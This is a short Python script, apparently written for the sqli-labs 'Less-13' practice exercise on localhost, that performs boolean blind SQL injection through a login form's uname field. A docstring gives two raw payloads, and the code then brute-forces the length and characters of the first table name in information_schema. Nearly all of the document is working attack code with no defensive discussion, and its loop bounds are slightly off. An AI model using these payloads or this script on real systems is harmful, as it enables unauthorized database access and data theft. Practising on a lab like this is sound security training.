'''
uname=admin') and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=6 #&passwd=1&submit=Submit
uname=admin') and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101#&passwd=1&submit=Submit
'''



import  requests

url='http://127.0.0.1/1/Less-13/'


def sqlin(sql,data,i):
    r = requests.post(url=sql,data=data)
    if 'flag' in r.text:
        return i
    else:

        print(sql+str(data))

def get_length():
    for i in range(1,50):
        data = {
            'uname':'admin\') and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)={0} #'.format(i),
            'passwd' : '1',
            'submit' : 'Submit'
        }
        sql = url
        result = sqlin(sql,data,i)
        if result:
            print(i)
            return i

def get_data(loca):
    for i in range(65,123):
        data = {
            'uname' : 'admin\') and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))={1}#&passwd=1&submit=Submit'.format(loca,i),
            'passwd' : '1',
            'submit' : 'Submit'
        }
        sql = url
        result = sqlin(sql,data,i)
        if result:
            return chr(result)
            print(chr(result))

if __name__ == '__main__':
    data = ''
    length = get_length()
    print(length)
    for loca in range(1,length):
        data += get_data(loca)
        print(data)

